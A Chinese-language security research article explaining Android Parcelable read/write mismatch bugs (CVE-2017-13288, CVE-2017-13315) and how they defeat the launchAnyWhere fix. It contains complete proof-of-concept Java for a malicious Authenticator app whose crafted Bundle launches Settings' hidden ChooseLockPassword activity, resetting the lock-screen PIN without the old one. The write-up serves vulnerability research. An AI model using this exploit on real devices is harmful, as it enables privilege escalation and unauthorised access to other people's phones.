> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/2364)

> 先知社区，先知安全技术社区

作者: heeeeen@MS509Team

### 0x00 简介

最近几个月，Android 安全公告公布了一系列系统框架层的高危提权漏洞，如下表所示。

<table><thead><tr><th>CVE</th><th>Parcelable 对象</th><th>公布时间</th></tr></thead><tbody><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/b87c968e5a41a1a09166199bf54eee12608f3900" target="_blank">CVE-2017-0806</a></td><td>GateKeeperResponse</td><td>2017.10</td></tr><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/47ebfaa2196aaf4fbeeec34f1a1c5be415cf041b%5E%21/#F0" target="_blank">CVE-2017-13286</a></td><td>OutputConfiguration</td><td>2018.04</td></tr><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/09ba8fdffd9c8d74fdc6bfb51bcebc27fc43884a" target="_blank">CVE-2017-13287</a></td><td>VerifyCredentialResponse</td><td>2018.04</td></tr><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/b796cd32a45bcc0763c50cc1a0cc8236153dcea3" target="_blank">CVE-2017-13288</a></td><td>PeriodicAdvertisingReport</td><td>2018.04</td></tr><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/5a3d2708cd2289a4882927c0e2cb0d3c21a99c02" target="_blank">CVE-2017-13289</a></td><td>ParcelableRttResults</td><td>2018.04</td></tr><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/2950276f61220e00749f8e24e0c773928fefaed8" target="_blank">CVE-2017-13311</a></td><td>SparseMappingTable</td><td>2018.05</td></tr><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/35bb911d4493ea94d4896cc42690cab0d4dbb78f" target="_blank">CVE-2017-13315</a></td><td>DcParamObject</td><td>2018.05</td></tr></tbody></table>

这批漏洞很有新意，似乎以前没有看到过类似的，其共同特点在于框架中 Parcelable 对象的写入（序列化）和读出（反序列化）不一致，比如将一个成员变量写入时为 long，而读入时为 int。这种错误显而易见，但是能够造成何种危害，如何证明是一个安全漏洞，却难以从补丁直观地得出结论。

由于漏洞原作者也没有给出 Writeup，这批漏洞披上了神秘面纱。好在[漏洞预警 | Android 系统序列化、反序列化不匹配漏洞](https://www.anquanke.com/post/id/103570) [1] 一文给出了漏洞利用的线索——绕过 launchAnywhere 的补丁。根据这个线索，我们能够利用有漏洞的 Parcelable 对象，实现以 Settings 系统应用发送任意 Intent 启动 Activity 的能力。

### 0x01 背景知识

#### Android Parcelable 序列化

Android 提供了独有的 Parcelable 接口来实现序列化的方法，只要实现这个接口，一个类的对象就可以实现序列化并可以通过 Intent 或 Binder 传输，见下面示例中的典型用法。

```
public class MyParcelable implements Parcelable {
     private int mData;

     public int describeContents() {
         return 0;
     }

     public void writeToParcel(Parcel out, int flags) {
         out.writeInt(mData);
     }

     public void readFromParcel(Parcel reply) {
         mData = in.readInt();
     }

     public static final Parcelable.Creator<MyParcelable> CREATOR
             = new Parcelable.Creator<MyParcelable>() {
         public MyParcelable createFromParcel(Parcel in) {
             return new MyParcelable(in);
         }

         public MyParcelable[] newArray(int size) {
             return new MyParcelable[size];
         }
     };

     private MyParcelable(Parcel in) {
         mData = in.readInt();
     }
 }

```

其中，关键的 writeToParcel 和 readFromParcel 方法，分别调用 Parcel 类中的一系列 write 方法和 read 方法实现序列化和反序列化。

#### Bundle

可序列化的 Parcelable 对象一般不单独进行序列化传输，需要通过 Bundle 对象携带。 Bundle 的内部实现实际是 Hashmap，以 Key-Value 键值对的形式存储数据。例如， Android 中进程间通信频繁使用的 Intent 对象中可携带一个 Bundle 对象，利用`putExtra(key, value)`方法，可以往 Intent 的 Bundle 对象中添加键值对 (Key Value)。Key 为 String 类型，而 Value 则可以为各种数据类型，包括 int、Boolean、String 和 Parcelable 对象等等，Parcel 类中维护着这些类型信息。

见 / frameworks/base/core/java/android/os/Parcel.java

```
// Keep in sync with frameworks/native/include/private/binder/ParcelValTypes.h.
    private static final int VAL_NULL = -1;
    private static final int VAL_STRING = 0;
    private static final int VAL_INTEGER = 1;
    private static final int VAL_MAP = 2;
    private static final int VAL_BUNDLE = 3;
    private static final int VAL_PARCELABLE = 4;
    private static final int VAL_SHORT = 5;
    private static final int VAL_LONG = 6;
    private static final int VAL_FLOAT = 7;

```

对 Bundle 进行序列化时，依次写入携带所有数据的长度、Bundle 魔数 (0x4C444E42) 和键值对。见 BaseBundle.writeToParcelInner 方法

```
int lengthPos = parcel.dataPosition();
        parcel.writeInt(-1); // dummy, will hold length
        parcel.writeInt(BUNDLE_MAGIC);
        int startPos = parcel.dataPosition();
        parcel.writeArrayMapInternal(map);
        int endPos = parcel.dataPosition();
        // Backpatch length
        parcel.setDataPosition(lengthPos);
        int length = endPos - startPos;
        parcel.writeInt(length);
        parcel.setDataPosition(endPos);

```

pacel.writeArrayMapInternal 方法写入键值对，先写入 Hashmap 的个数，然后依次写入键和值

```
/**
     * Flatten an ArrayMap into the parcel at the current dataPosition(),
     * growing dataCapacity() if needed.  The Map keys must be String objects.
     */
    /* package */ void writeArrayMapInternal(ArrayMap<String, Object> val) {
        ...
        final int N = val.size();
        writeInt(N);
       ... 
        int startPos;
        for (int i=0; i<N; i++) {
            if (DEBUG_ARRAY_MAP) startPos = dataPosition();
            writeString(val.keyAt(i));
            writeValue(val.valueAt(i));
        ...

```

接着，调用 writeValue 时依次写入 Value 类型和 Value 本身，如果是 Parcelable 对象，则调用 writeParcelable 方法，后者会调用 Parcelable 对象的 writeToParcel 方法。

```
public final void writeValue(Object v) {
        if (v == null) {
            writeInt(VAL_NULL);
        } else if (v instanceof String) {
            writeInt(VAL_STRING);
            writeString((String) v);
        } else if (v instanceof Integer) {
            writeInt(VAL_INTEGER);
            writeInt((Integer) v);
        } else if (v instanceof Map) {
            writeInt(VAL_MAP);
            writeMap((Map) v);
        } else if (v instanceof Bundle) {
            // Must be before Parcelable
            writeInt(VAL_BUNDLE);
            writeBundle((Bundle) v);
        } else if (v instanceof PersistableBundle) {
            writeInt(VAL_PERSISTABLEBUNDLE);
            writePersistableBundle((PersistableBundle) v);
        } else if (v instanceof Parcelable) {
            // IMPOTANT: cases for classes that implement Parcelable must
            // come before the Parcelable case, so that their specific VAL_*
            // types will be written.
            writeInt(VAL_PARCELABLE);
            writeParcelable((Parcelable) v, 0);

```

反序列化过程则完全是一个对称的逆过程，依次读入 Bundle 携带所有数据的长度、Bundle 魔数 (0x4C444E42)、键和值，如果值为 Parcelable 对象，则调用对象的 readFromParcel 方法，重新构建这个对象。

通过下面的代码，我们还可以把序列化后的 Bundle 对象存为文件进行研究。

```
Bundle bundle = new Bundle();
bundle.putParcelable(AccountManager.KEY_INTENT, makeEvilIntent());

byte[] bs = {'a', 'a','a', 'a'};
bundle.putByteArray("AAA", bs);
Parcel testData = Parcel.obtain();
bundle.writeToParcel(testData, 0);
byte[] raw = testData.marshall();
        try {
            FileOutputStream fos = new FileOutputStream("/sdcard/obj.pcl");
            fos.write(raw);
            fos.close();
        } catch (FileNotFoundException e){
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

```

查看序列化后的 Bundle 数据如图  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180530175404-62e42efc-63ef-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180530175404-62e42efc-63ef-1.png)

#### LaunchAnyWhere 漏洞

Retme 的[这篇文章](http://retme.net/index.php/2014/08/20/launchAnyWhere.html) [2] 对 LaunchAnyWhere 漏洞进行了详细解析，这里我们借用文中的图，对漏洞简单进行回顾。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180530175404-63269efe-63ef-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180530175404-63269efe-63ef-1.png)

普通 AppB 作为 Authenticator，通过 Binder 传递一个 Bundle 对象到 system_server 中的 AccountManagerService，这个 Bundle 对象中包含的一个键值对`{KEY_INTENT:intent}`最终会传递到 Settings 系统应用，由后者调用 startActivity(intent)。漏洞的关键在于，intent 可以由普通 AppB 任意指定，那么由于 Settings 应用为高权限 system 用户（uid=1000)，因此最后的 startActivity(intent) 就可以启动手机上的任意 Activity，包括未导出的 Activity。例如，intent 中指定 Settings 中的`com.android.settings.password.ChooseLockPassword`为目标 Activity, 则可以在不需要原锁屏密码的情况下重设锁屏密码。

Google 对于这个漏洞的修补是在 AccountManagerService 中对 AppB 指定的 intent 进行检查，确保 intent 中目标 Activity 所属包的签名与调用 AppB 一致。

```
protected void checkKeyIntent(
4704                int authUid,
4705                Intent intent) throws SecurityException {
4706            long bid = Binder.clearCallingIdentity();
4707            try {
4708                PackageManager pm = mContext.getPackageManager();
4709                ResolveInfo resolveInfo = pm.resolveActivityAsUser(intent, 0, mAccounts.userId);
4710                ActivityInfo targetActivityInfo = resolveInfo.activityInfo;
4711                int targetUid = targetActivityInfo.applicationInfo.uid;
4712                if (!isExportedSystemActivity(targetActivityInfo)
4713                        && (PackageManager.SIGNATURE_MATCH != pm.checkSignatures(authUid,
4714                                targetUid))) {
4715                    String pkgName = targetActivityInfo.packageName;
4716                    String activityName = targetActivityInfo.name;
4717                    String tmpl = "KEY_INTENT resolved to an Activity (%s) in a package (%s) that "
4718                            + "does not share a signature with the supplying authenticator (%s).";
4719                    throw new SecurityException(
4720                            String.format(tmpl, activityName, pkgName, mAccountType));
4721                }

```

上次过程涉及到两次跨进程的序列化数据传输。第一次，普通 AppB 将 Bundle 序列化后通过 Binder 传递给`system_server`，然后`system_server`通过 Bundle 的一系列 getXXX（如 getBoolean、getParcelable) 函数触发反序列化，获得 KEY_INTENT 这个键的值——一个 intent 对象，进行安全检查。  
若检查通过，调用 writeBundle 进行第二次序列化，然后 Settings 中反序列化后重新获得`{KEY_INTENT:intent}`，调用 startActivity。

如果第二次序列化和反序列化过程不匹配，那么就有可能在`system_server`检查时 Bundle 中恶意的`{KEY_INTENT:intent}`不出现，而在`Settings`中出现，那么就完美地绕过了`checkKeyIntent`检查！下面我们就结合两个案例来说明其中的玄机。

### 0x02 案例 1：CVE-2017-13288

四月份公布的 CVE-2017-13288 漏洞出现在 PeriodicAdvertisingReport 类中，对比 writeToParcel 和 readFromParcel 函数

```
@Override
    public void writeToParcel(Parcel dest, int flags) {
        dest.writeInt(syncHandle);
        dest.writeLong(txPower);
        dest.writeInt(rssi);
        dest.writeInt(dataStatus);
        if (data != null) {
            dest.writeInt(1);
            dest.writeByteArray(data.getBytes());
        } else {
            dest.writeInt(0);
        }
    }
    private void readFromParcel(Parcel in) {
        syncHandle = in.readInt();
        txPower = in.readInt();
        rssi = in.readInt();
        dataStatus = in.readInt();
        if (in.readInt() == 1) {
            data = ScanRecord.parseFromBytes(in.createByteArray());
        }
    }

```

在对 txPower 这个 int 类型成员变量进行操作时，写为 long，读为 int，因此经历一次不匹配的序列化和反序列化后 txPower 之后的成员变量都会错位 4 字节。那么如何绕过`checkKeyIntent`检查？

这是一项有挑战性的工作，需要在 Bundle 中精确布置数据。经过几天的思索，我终于想出了以下的解决方案：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180530175404-6338674c-63ef-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180530175404-6338674c-63ef-1.png)

在 Autherticator App 中构造恶意 Bundle，携带两个键值对。第一个键值对携带一个 PeriodicAdvertisingReport 对象，并将恶意 KEY_INTENT 的内容放在 mData 这个 ByteArray 类型的成员中，第二个键值对随便放点东西。由于这一次序列化需要精确控制内容，我们不希望发生不匹配，因此将 PeriodicAdvertisingReport 对象 writeToParcel 时，要和其 readFromParcel 对应。

那么在`system_server`发生的第一次反序列化中，生成 PeriodicAdvertisingReport 对象，syncHandle、txPower、rssi、dataStatus 这些 int 型的数据均通过 readInt 读入为 1，同时由于接下来的 flag 也为 1，将恶意`KEY_INTENT`的内容读入到 mData。此时，恶意 KEY_INTENT 不是一个单独的键值对，因此可以逃避 checkIntent 检查。

接着`system_server`将这个 Bundle 序列化，此时 txPower 这个变量使用 writeLong 写入 Bundle，因此为占据 8 个字节，前 4 字节为 1，后 4 字节为 0。txPower 后面的内容写入 Bundle 不变。

最后在`Settings`发生反序列化，txPower 此时又变成了 readInt，因此 txPower 读入为 1，后面接着 rssi 却读入为 0，发生了四字节的错位！接下来 dataStatus 读入为 1，flag 读入为 1，`Settings`认为后面还有 ByteArray，但读入的长度域却为 1，因此把后面恶意 KEY_INTENT 的 4 字节 length （ByteArray 4 字节对齐）当做 mData。至此，第一个键值对反序列化完毕。然后，恶意`KEY_INTENT`作为一个新的键值对就堂而皇之的出现了！最终的结果是取得以 Settings 应用的权限发送任意 Intent，启动任意 Activity 的能力。

#### POC

参考 [2] 编写 Authenticator App，主要要点：

在 AndroidManifest 文件中设置

```
<service android: >
            <intent-filter>
                <action
                    android: />
            </intent-filter>
            <meta-data android:
                android:resource="@xml/authenticator" />
        </service>

```

实现 AuthenticatorService

```
public class AuthenticatorService extends Service {
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        MyAuthenticator authenticator = new MyAuthenticator(this);
        return authenticator.getIBinder();
    }
}

```

实现 Authenticator，addAccount 方法中构建恶意 Bundle

```
public class MyAuthenticator extends AbstractAccountAuthenticator {
    static final String TAG = "MyAuthenticator";

    private Context m_context = null;

    public MyAuthenticator(Context context) {
        super(context);
        m_context = context;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {
        Log.v(TAG, "addAccount");

        Bundle evilBundle = new Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();

        // Manipulate the raw data of bundle Parcel
        // Now we replace this right Parcel data to evil Parcel data
        pcelData.writeInt(2); // number of elements in ArrayMap
        /*****************************************/
        // mismatched object
        pcelData.writeString("mismatch");
        pcelData.writeInt(4); // VAL_PACELABLE
        pcelData.writeString("android.bluetooth.le.PeriodicAdvertisingReport"); // name of Class Loader
        pcelData.writeInt(1);//syncHandle
        pcelData.writeInt(1);//txPower
        pcelData.writeInt(1);//rssi
        pcelData.writeInt(1);//dataStatus
        pcelData.writeInt(1);// flag for data
        pcelData.writeInt(0x144); //length of KEY_INTENT:evilIntent
        // Evil object hide in PeriodicAdvertisingReport.mData
        pcelData.writeString(AccountManager.KEY_INTENT);
        pcelData.writeInt(4);
        pcelData.writeString("android.content.Intent");// name of Class Loader
        pcelData.writeString(Intent.ACTION_RUN); // Intent Action
        Uri.writeToParcel(pcelData, null); // Uri is null
        pcelData.writeString(null); // mType is null
        pcelData.writeInt(0x10000000); // Flags
        pcelData.writeString(null); // mPackage is null
        pcelData.writeString("com.android.settings");
        pcelData.writeString("com.android.settings.password.ChooseLockPassword");
        pcelData.writeInt(0); //mSourceBounds = null
        pcelData.writeInt(0); // mCategories = null
        pcelData.writeInt(0); // mSelector = null
        pcelData.writeInt(0); // mClipData = null
        pcelData.writeInt(-2); // mContentUserHint
        pcelData.writeBundle(null);
        ///////////////////////////////////////
        pcelData.writeString("Padding-Key");
        pcelData.writeInt(0); // VAL_STRING
        pcelData.writeString("Padding-Value"); //       
        int length  = pcelData.dataSize();
        Log.d(TAG, "length is " + Integer.toHexString(length));
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444E42);
        bndlData.appendFrom(pcelData, 0, length);
        bndlData.setDataPosition(0);
        evilBundle.readFromParcel(bndlData);
        Log.d(TAG, evilBundle.toString());
        return evilBundle;
   }

```

### 0x03 案例 2：CVE-2017-13315

五月份修复的 CVE-2017-13315 出现在 DcParamObject 类中，对比 writeToParcel 和 readFromParcel 函数.

```
public void writeToParcel(Parcel dest, int flags) {
        dest.writeLong(mSubId);
    }
    private void readFromParcel(Parcel in) {
        mSubId = in.readInt();
    }

```

int 类型的成员变量 mSubId 写入时为 long，读出时为 int，没有可借用的其他成员变量，似乎在 Bundle 中布置数据更有挑战性。但受前面将恶意 KEY_INTENT 置于 ByteArray 中启发，可以采用如下方案。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180530175404-6345dfda-63ef-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180530175404-6345dfda-63ef-1.png)

在 Autherticator App 中构造恶意 Bundle，携带三个键值对。第一个键值对携带一个 DcParamObject 对象；第二个键值对的键的 16 进制表示为 0x06，长度为 1，值的类型为 13 代表 ByteArray，然后将恶意 KEY_INTENT 的内容放在 ByteArray 中；接下来，再随便放置一个键值对。

那么在`system_server`发生的第一次反序列化中，生成 DcParamObject 对象，mSubId 通过 readInt 读入为 1。后面两个键值对都不是 KEY_INTENT，因此可以通过 checkIntent 检查。

然后，第二次序列化时`system_server`通过 writeLong 将 mSubId 写入 Bundle，多出四个字节为 0x0000 0000 0000 0001，后续内容不变。

最后，`Settings`反序列化读入 Bundle，由于读入 mSubID 仍然为 readInt，因此只读到 0x0000 0001 就认为读 DcParamObject 完毕。接下来开始读第二个键值对，把多出来的四个字节 0x0000 0000 连同紧接着的 1，认为是第二个键值对的键为 null，然后 6 作为类型参数被读入，认为是 long，于是后面把 13 和接下来 ByteArray length 的 8 字节作为第二个键值对的值。最终，恶意 KEY_INTENT 显现出来作为第三个键值对！

#### POC

```
Bundle evilBundle = new Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();

        // Manipulate the raw data of bundle Parcel
        // Now we replace this right Parcel data to evil Parcel data
        pcelData.writeInt(3); // number of elements in ArrayMap
        /*****************************************/
        // mismatched object
        pcelData.writeString("mismatch");
        pcelData.writeInt(4); // VAL_PACELABLE
        pcelData.writeString("com.android.internal.telephony.DcParamObject"); // name of Class Loader
        pcelData.writeInt(1);//mSubId

        pcelData.writeInt(1);
        pcelData.writeInt(6);
        pcelData.writeInt(13);
        //pcelData.writeInt(0x144); //length of KEY_INTENT:evilIntent
        pcelData.writeInt(-1); // dummy, will hold the length
        int keyIntentStartPos = pcelData.dataPosition();
        // Evil object hide in ByteArray
        pcelData.writeString(AccountManager.KEY_INTENT);
        pcelData.writeInt(4);
        pcelData.writeString("android.content.Intent");// name of Class Loader
        pcelData.writeString(Intent.ACTION_RUN); // Intent Action
        Uri.writeToParcel(pcelData, null); // Uri is null
        pcelData.writeString(null); // mType is null
        pcelData.writeInt(0x10000000); // Flags
        pcelData.writeString(null); // mPackage is null
        pcelData.writeString("com.android.settings");
        pcelData.writeString("com.android.settings.password.ChooseLockPassword");
        pcelData.writeInt(0); //mSourceBounds = null
        pcelData.writeInt(0); // mCategories = null
        pcelData.writeInt(0); // mSelector = null
        pcelData.writeInt(0); // mClipData = null
        pcelData.writeInt(-2); // mContentUserHint
        pcelData.writeBundle(null);

        int keyIntentEndPos = pcelData.dataPosition();
        int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos;
        pcelData.setDataPosition(keyIntentStartPos - 4);  // backpatch length of KEY_INTENT
        pcelData.writeInt(lengthOfKeyIntent);
        pcelData.setDataPosition(keyIntentEndPos);
        Log.d(TAG, "Length of KEY_INTENT is " + Integer.toHexString(lengthOfKeyIntent));

        ///////////////////////////////////////
        pcelData.writeString("Padding-Key");
        pcelData.writeInt(0); // VAL_STRING
        pcelData.writeString("Padding-Value"); //


        int length  = pcelData.dataSize();
        Log.d(TAG, "length is " + Integer.toHexString(length));
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444E42);
        bndlData.appendFrom(pcelData, 0, length);
        bndlData.setDataPosition(0);
        evilBundle.readFromParcel(bndlData);
        Log.d(TAG, evilBundle.toString());
       return evilBundle;

    }

```

由于 Settings 似乎取消了自动化的点击新建账户接口，上述 POC 利用的漏洞触发还需要用户在 Settings->Users&accounts 中点击我们加入的 Authenticator，点击以后就会调用 addAccount 方法，最终能够启动 settings 中的隐藏 Activity ChooseLockPassword。

```
05-07 06:24:34.337  4646  5693 I ActivityManager: START u0 {act=android.intent.action.RUN flg=0x10000000 cmp=com.android.settings/.password.ChooseLockPassword (has extras)} from uid 1000

```

原先设置锁屏 PIN 码的测试手机，就会出现重新设置 PIN 码界面，点一下返回，就会出现以下 PIN 码设置界面。这样就可以在不需要原 PIN 码的情况下重设锁屏密码。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180530175405-6391fb22-63ef-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180530175405-6391fb22-63ef-1.png)

### 0x04 后记

没想到序列化和反序列化作为极小的编程错误，却可以带来深远的安全影响。这类漏洞可能在接下来的安全公告中还会陆续有披露，毕竟在源码树中搜索序列化和反序列化不匹配的 Parcelable 类是较为容易的，漏洞的作者应该持续发现了一批。

然而，每个类不匹配的情况有所不同，因此在漏洞利用绕过 launchAnywhere 补丁时需要重新精确布置 Bundle，读者可以用其他有漏洞的 Parcelable 类来练手。

这类漏洞也是不匹配或者说不一致（Inconsistency) 性漏洞的典型。除了序列化和反序列化不一致外，历史上 mmap 和 munmap 不一致、同一功能实现在 Java 和 C 中的不一致、不同系统对同一标准实现的不一致等等都产生过有趣的漏洞，寻找这种不一致也是漏洞研究的一种方法论。

### 参考

[1] [漏洞预警 | Android 系统序列化、反序列化不匹配漏洞](https://www.anquanke.com/post/id/103570)

[2] [launchAnyWhere: Activity 组件权限绕过漏洞解析](http://retme.net/index.php/2014/08/20/launchAnyWhere.html)